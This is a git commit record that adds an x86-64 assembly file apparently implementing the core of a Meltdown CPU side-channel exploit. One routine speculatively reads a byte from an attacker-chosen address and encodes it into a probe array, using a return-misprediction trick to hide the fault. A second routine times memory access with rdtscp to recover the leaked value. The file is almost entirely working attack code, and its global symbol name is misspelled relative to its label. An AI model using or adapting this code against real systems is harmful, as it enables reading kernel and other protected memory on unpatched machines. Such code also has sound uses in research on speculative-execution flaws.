5f4da5ba162af7c8a2fd5ff5154007a4a2cd4641
John Menerick <john@syn.agency>
2018-01-04 16:13:35 -0800

    uploaded linux while keeping other OSs from public view

---
+++ Linux/revengmeltdown.s
@@ -0,0 +1,40 @@
+.file "revengmeltdown.s"
+.intel_syntax noprefix
+.text
+
+.globl revengmeldown 
+.type revengmeltdown, @function
+revengmeltdown:
+  mfence
+  call herring
+  movzx eax, byte ptr [rdi]
+  shl eax, 12
+  movzx eax, byte ptr [rsi+rax]
+
+herring:
+  # Lots of slow dependent instructions:
+  xorps xmm0, xmm0
+  aesimc xmm0, xmm0
+  aesimc xmm0, xmm0
+  aesimc xmm0, xmm0
+  aesimc xmm0, xmm0
+  # Using result of dependent instructions, adjust rsp to trick prediction of ret
+  movd eax, xmm0
+  lea rsp, [rsp+rax+8]
+  ret # Actually returns from revengmeltdown, but predicted as returning from herring 
+
+.globl timed_read
+.type timed_read, @function
+timed_read:
+  rdtscp
+  shl rdx, 32
+  or rax, rdx
+  mov rsi, rax
+  mov al, [rdi]
+  rdtscp
+  shl rdx, 32
+  or rax, rdx
+  sub rax, rsi
+  ret
+
+.section .note.GNU-stack, "", @progbits
